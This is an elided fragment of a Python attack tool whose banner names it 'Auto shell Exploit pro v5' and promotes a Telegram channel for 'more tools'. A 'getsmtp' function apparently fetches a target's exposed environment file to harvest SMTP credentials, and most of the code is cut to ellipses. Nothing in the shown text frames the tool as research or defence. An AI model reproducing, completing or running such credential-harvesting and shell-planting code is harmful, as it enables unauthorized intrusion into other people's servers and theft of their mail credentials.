...
def getsmtp(url):
	...
	try:
		...
		rsmTP = requests.get(eNv, headers=headers, timeout=30)
...
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Auto shell Exploit pro v5 by Russianhacker0125 respect all hackers around the world Telegram more tools : t.me/russianhacker0125")
